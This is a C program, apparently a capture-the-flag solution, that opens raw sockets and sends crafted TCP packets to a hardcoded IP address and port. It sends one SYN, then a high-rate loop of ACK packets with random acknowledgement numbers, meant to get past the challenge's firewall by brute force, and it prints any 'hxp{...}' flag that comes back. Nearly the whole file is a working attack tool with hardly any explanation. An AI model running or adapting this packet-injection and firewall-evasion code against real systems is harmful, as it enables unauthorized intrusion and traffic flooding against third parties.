#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static uint32_t xorshift32(uint32_t *x) {
  uint32_t v = *x;
  v ^= v << 13;
  v ^= v >> 17;
  v ^= v << 5;
  *x = v;
  return v;
}

static uint32_t sum16_words(const void *buf, size_t len) {
  const uint8_t *p = (const uint8_t *)buf;
  uint32_t s = 0;
  for (size_t i = 0; i + 1 < len; i += 2) {
    s += ((uint32_t)p[i] << 8) | p[i + 1];
  }
  if (len & 1) {
    s += ((uint32_t)p[len - 1] << 8);
  }
  return s;
}

static uint16_t fold16(uint32_t s) {
  s = (s & 0xFFFF) + (s >> 16);
  s = (s & 0xFFFF) + (s >> 16);
  return (uint16_t)s;
}

static uint16_t ip_checksum(const void *hdr, size_t len) {
  uint32_t s = sum16_words(hdr, len);
  return (uint16_t)(~fold16(s));
}

static int get_src_for_dst(const struct sockaddr_in *dst, struct in_addr *src_out) {
  int s = socket(AF_INET, SOCK_DGRAM, 0);
  if (s < 0) return -1;
  if (connect(s, (const struct sockaddr *)dst, sizeof(*dst)) < 0) {
    close(s);
    return -1;
  }
  struct sockaddr_in src = {0};
  socklen_t slen = sizeof(src);
  if (getsockname(s, (struct sockaddr *)&src, &slen) < 0) {
    close(s);
    return -1;
  }
  close(s);
  *src_out = src.sin_addr;
  return 0;
}

int main(int argc, char **argv) {
  const char *dst_ip = (argc > 1) ? argv[1] : "46.224.125.47";
  const uint16_t dport = 1996;

  struct sockaddr_in dst = {0};
  dst.sin_family = AF_INET;
  dst.sin_port = htons(dport);
  if (inet_pton(AF_INET, dst_ip, &dst.sin_addr) != 1) return 2;

  struct in_addr src_addr;
  if (get_src_for_dst(&dst, &src_addr) != 0) return 2;

  srand((unsigned)time(NULL) ^ (unsigned)getpid());
  uint16_t sport = (uint16_t)(1024 + (rand() % (65535 - 1024)));
  uint32_t iss = ((uint32_t)rand() << 16) ^ (uint32_t)rand();

  int sendfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sendfd < 0) return 2;
  int one = 1;
  if (setsockopt(sendfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) return 2;

  int recvfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (recvfd < 0) return 2;

  uint8_t pkt[60];
  memset(pkt, 0, sizeof(pkt));

  struct iphdr *iph = (struct iphdr *)pkt;
  struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));

  iph->version = 4;
  iph->ihl = 5;
  iph->tos = 0;
  iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
  iph->id = htons((uint16_t)rand());
  iph->frag_off = 0;
  iph->ttl = 64;
  iph->protocol = IPPROTO_TCP;
  iph->saddr = src_addr.s_addr;
  iph->daddr = dst.sin_addr.s_addr;
  iph->check = 0;
  iph->check = ip_checksum(iph, sizeof(struct iphdr));

  tcph->source = htons(sport);
  tcph->dest = htons(dport);
  tcph->seq = htonl(iss + 1); // ACK de 3-way handshake: seq = iss+1
  tcph->ack_seq = 0; // variable
  tcph->doff = 5;
  tcph->ack = 1;
  tcph->syn = 0;
  tcph->window = htons(64240);
  tcph->check = 0; // variable
  tcph->urg_ptr = 0;

  // TCP checksum base sum with ack=0 and check=0.
  struct {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t zero;
    uint8_t proto;
    uint16_t len;
  } pseudo;
  pseudo.saddr = iph->saddr;
  pseudo.daddr = iph->daddr;
  pseudo.zero = 0;
  pseudo.proto = IPPROTO_TCP;
  pseudo.len = htons(sizeof(struct tcphdr));

  uint32_t base = sum16_words(&pseudo, sizeof(pseudo)) + sum16_words(tcph, sizeof(struct tcphdr));

  uint32_t rng = ((uint32_t)rand() << 1) | 1u;
  uint8_t rbuf[4096];

  struct pollfd pfd = {.fd = recvfd, .events = POLLIN};
  struct timeval start;
  gettimeofday(&start, NULL);
  int max_seconds = 180;
  if (argc > 2) {
    int v = atoi(argv[2]);
    if (v > 0) max_seconds = v;
  }
  uint64_t tries = 0;

  // Enviar un SYN “real” primero (probablemente será DROP por iptables del reto),
  // pero puede ayudar a que firewalls stateful/conntrack consideren posteriores ACKs.
  {
    struct tcphdr synhdr = *tcph;
    synhdr.ack = 0;
    synhdr.syn = 1;
    synhdr.seq = htonl(iss);
    synhdr.ack_seq = 0;
    synhdr.check = 0;
    uint32_t synsum = sum16_words(&pseudo, sizeof(pseudo)) + sum16_words(&synhdr, sizeof(synhdr));
    synhdr.check = (uint16_t)~fold16(synsum);
    memcpy(tcph, &synhdr, sizeof(synhdr));
    (void)sendto(sendfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&dst, sizeof(dst));
    // volver a ACK template
    tcph->ack = 1;
    tcph->syn = 0;
    tcph->ack_seq = 0;
    tcph->check = 0;
  }

  for (;;) {
    // Intento ACK con ack_seq aleatorio.
    uint32_t ack = xorshift32(&rng);
    tcph->ack_seq = htonl(ack);
    tcph->check = 0;
    uint32_t s = base + ((ack >> 16) & 0xFFFF) + (ack & 0xFFFF);
    tcph->check = (uint16_t)~fold16(s);

    (void)sendto(sendfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&dst, sizeof(dst));
    tries++;

    // Mirar si entra algo (no bloquear), pero no en cada iteración (mejor throughput).
    if ((tries & 0x3FF) == 0) {
      int pr = poll(&pfd, 1, 0);
      if (pr > 0 && (pfd.revents & POLLIN)) {
        for (int k = 0; k < 16; k++) {
          ssize_t n = recv(recvfd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
          if (n <= 0) break;
          struct iphdr *ri = (struct iphdr *)rbuf;
          if ((size_t)n < sizeof(struct iphdr)) continue;
          if (ri->protocol != IPPROTO_TCP) continue;
          size_t ihl = (size_t)ri->ihl * 4;
          if ((size_t)n < ihl + sizeof(struct tcphdr)) continue;
          struct tcphdr *rt = (struct tcphdr *)(rbuf + ihl);

          if (ri->saddr != dst.sin_addr.s_addr) continue;
          if (ntohs(rt->source) != dport) continue;
          if (ntohs(rt->dest) != sport) continue;

          size_t thl = (size_t)rt->doff * 4;
          if ((size_t)n < ihl + thl) continue;
          const uint8_t *payload = rbuf + ihl + thl;
          size_t plen = (size_t)n - (ihl + thl);
          if (plen > 0) {
            for (size_t i = 0; i + 4 < plen; i++) {
              if (payload[i] == 'h' && payload[i + 1] == 'x' && payload[i + 2] == 'p' && payload[i + 3] == '{') {
                size_t j = i;
                while (j < plen && payload[j] != '}') j++;
                if (j < plen && payload[j] == '}') {
                  fwrite(payload + i, 1, (j - i) + 1, stdout);
                  fputc('\n', stdout);
                  return 0;
                }
              }
            }
          }
        }
      }
    }

  timecheck:;
    struct timeval now;
    gettimeofday(&now, NULL);
    int elapsed = (int)(now.tv_sec - start.tv_sec);
    if (elapsed >= max_seconds) break;
  }

  fprintf(stderr, "tries=%llu\n", (unsigned long long)tries);
  return 1;
}

